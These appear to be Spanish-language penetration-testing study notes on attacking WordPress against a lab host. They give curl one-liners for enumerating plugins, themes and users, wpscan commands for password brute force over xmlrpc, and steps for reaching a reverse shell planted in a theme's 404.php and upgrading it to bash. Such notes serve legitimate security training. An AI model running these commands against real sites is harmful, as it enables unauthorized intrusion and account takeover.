## Las siguientes técnicas no son concluyentes y se necesita un recorrido manual para encontrar más información y plugins.


#### Passive plugins enumeration

    curl -s -X GET http://página | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2


Tener en cuenta que cada plugin tiene un readme que se encuentra en:

        /wp-content/plugins/<plugin-name>/readme.txt
        
#### Passive themes enumeration

    curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2


#### User Enumeration

Listar de a un usuario:

    curl -s -I -X GET http://blog.inlanefreight.com/?author=1

O la lista de usuarios en un json:

    curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq



### WPSCAN

#### Enumerar todo el sitio y plugins:
        wpscan -url "" --enumerate  --api-token <api-token>
#### BF:
        wpscan -url "" --usernames "" --passwords "dictio"

también puede hacerse:

        sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P <dictio> --url <sitio>


### Explotar una WP desde la página de error 404
#### Acceder a la pagina php con la shell
        http://"ip o url"/wp-content/themes/"tema"/404.php

si la reverse shell es la monkey, para migrar a una shell más estable:
        python -c 'import pty;pty.spawn("/bin/bash")' 
